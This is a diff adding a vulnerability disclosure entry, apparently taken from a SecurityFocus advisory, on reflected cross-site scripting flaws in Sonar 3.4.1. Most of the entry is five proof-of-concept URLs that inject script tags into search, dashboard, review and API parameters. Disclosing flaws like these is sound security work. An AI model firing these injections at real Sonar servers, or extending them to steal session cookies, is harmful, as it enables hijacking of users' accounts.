@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/57982/info
+
+Sonar is prone to multiple cross-site scripting vulnerabilities because it fails to sanitize user-supplied input. 
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+Sonar 3.4.1 is vulnerable; other versions may also be affected.
+
+http://www.example.com/dependencies/index?search="><script>alert(/devilteam.pl/)</script> 
+
+http://www.example.com/dashboard/index/41730?did=4&period=3"><script>alert(/devilteam.pl/)</script> 
+
+http://www.example.com/reviews/index?review_id=&statuses[]=OPEN&statuses[]=REOPENED&severities[]=&projects[]=&amp;author_login=&assignee_login="><script>alert(/devilteam.pl/)</script>&false_positives=without&sort=&asc=false&commit=Search
+
+http://www.example.com/reviews/index?review_id=&statuses[]=OPEN&statuses[]=REOPENED&severities[]=&projects[]=&amp;author_login="><script>alert(/devilteam.pl/)</script>&assignee_login=&false_positives=without&sort=&asc=false&commit=Search
+
+http://www.example.com/api/sources?resource=<script>alert(/devilteam.pl/)</script>&format=txt
